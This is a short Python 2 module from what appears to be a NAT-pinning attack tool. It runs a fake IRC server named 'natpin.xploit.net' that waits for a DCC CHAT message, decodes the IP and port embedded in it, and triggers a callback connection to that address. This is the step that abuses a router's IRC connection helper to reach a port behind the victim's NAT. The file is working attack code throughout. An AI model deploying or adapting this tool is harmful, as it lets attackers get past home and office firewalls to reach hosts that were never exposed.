#!/usr/bin/env python
#filename=irc.py
from base import *
import socket
import random
import struct

class Server(Base):
	def __init__(self,serverPort=6667,sCallbackType="socket"):
		Base.__init__(self,"TCP",serverPort,sCallbackType)
		self.EXIT_ON_CB = 1
		self.CB_TYPE=sCallbackType
	#end def
	def protocolhandler(self,conn, addr):
		#we just received a new connection at this point
		#send initial IRC server data
		IRC_NAME="natpin.xploit.net"
		conn.send(IRC_NAME + " NOTICE AUTH :*** Looking up your hostname...\r\n")
		while True:
			request = conn.recv(1024).strip()
			parts = request.split(" ")
			if parts[0]=="NICK":
				conn.send(":"+IRC_NAME+" 376 natpin252 :End of /MOTD command.\r\n")
			elif parts[0]=="PRIVMSG":
				if parts[3] == "CHAT":
					numip = long(parts[5])
					numip = socket.inet_ntoa(struct.pack('!I', numip))		
					numport = parts[6].replace("\x01","")
					self.log("IRC Received DCC CHAT callback request.")
					#this is where callback needs to happen
					self.callback("IRC", self.CB_TYPE,numip,int(numport))
					if self.EXIT_ON_CB == 1:
						break
			#end if
	#end def
#end class
